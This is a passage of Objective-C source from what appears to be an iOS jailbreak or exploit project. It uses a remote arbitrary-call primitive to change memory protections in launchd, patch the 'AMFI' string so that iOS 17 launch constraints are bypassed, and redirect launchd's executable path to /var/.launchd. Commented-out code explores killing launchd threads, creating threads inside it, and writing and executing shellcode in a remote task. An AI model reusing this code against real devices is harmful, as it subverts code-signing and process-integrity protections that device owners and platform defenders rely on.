            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_COPY);
            if (kr != KERN_SUCCESS) {
                printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
                abort();
            }
        }
        
if(@available(iOS 17.0, *)) {

        assert(amfi_str_off != 0);

        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
        // Bypass panic by launch constraints
        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments

        // Patch string `AMFI`
        
        [self.dtProc writeString:map string:NEW_AMFI_STRING];
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            abort();
        }
        [self.dtProc taskHexDump:launchd_base + amfi_str_off size:0x100 task:(mach_port_t)launchd_task map:(uint64_t)map];
}

        // Overwrite /sbin/launchd string to /var/.launchd
        const char *newPath = NEW_LAUNCHD_PATH;
        [self.dtProc writeString:map string:newPath];
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            abort();
        }
        printf("Successfully overwrote launchd executable path string to %s\n", newPath);

        //RemoteArbCall(self.dtProc, exit, 0);
        
        // stuff
//        uint64_t remote_list = map + sizeof(uint64_t);
//        RemoteArbCall(self.dtProc, task_threads, launchd_task, remote_list, map);
//        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
//        RemoteArbCall(self.dtProc, memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
//        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
//        for (int i = 0; i < listCnt; i++) {
//            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
//            // panic your launchd
//            RemoteArbCall(self.dtProc, thread_abort, act_list[i]);
//        }
        
//        arm_thread_state64_internal ts;
//        RemoteArbCall(self.dtProc, memset, map+0x10, 0x41, sizeof(ts));
//        kr = RemoteArbCall(self.dtProc, thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
//        printf("thread_create_running returned %d\n", kr);
//        thread_act_t tid = RemoteRead32(map);
//        printf("tid: 0x%x\n", tid);
        
//        printf("Sleeping...\n");
//        RemoteArbCall(self.dtProc, sleep, 10);
        
        // Get remote dyld base for blr x19
//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
//        kern_return_t kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
//        if (kr != KERN_SUCCESS) {
//            printf("task_info failed\n");
//            abort();
//        }
//        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
//        vm_address_t remote_dyld_base;
//        do {
//            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
//            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
//            // FIXME: why do I have to sleep a bit for dyld base to be available?
//            usleep(100000);
//        } while (remote_dyld_base == 0);
//        blrX19Address = remote_dyld_base + blrX19Offset;
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
//        RemoteArbCall(self.dtProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
//        mach_port_t remote_bootstrap_port = RemoteRead32(map);
//        RemoteWriteString(map, "_os_alloc_once_table");
//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(self.dtProc, dlsym, (uint64_t)RTLD_DEFAULT, map);
//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(self.dtProc, _os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
//        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.dtProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0);
//        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
//        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
//        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
//        RemoteArbCall(self.dtProc, (void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(self.dtProc, ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(self.dtProc, ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(self.dtProc, mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(self.dtProc, ((uint64_t (*)(void))map));
    // });
}

@end
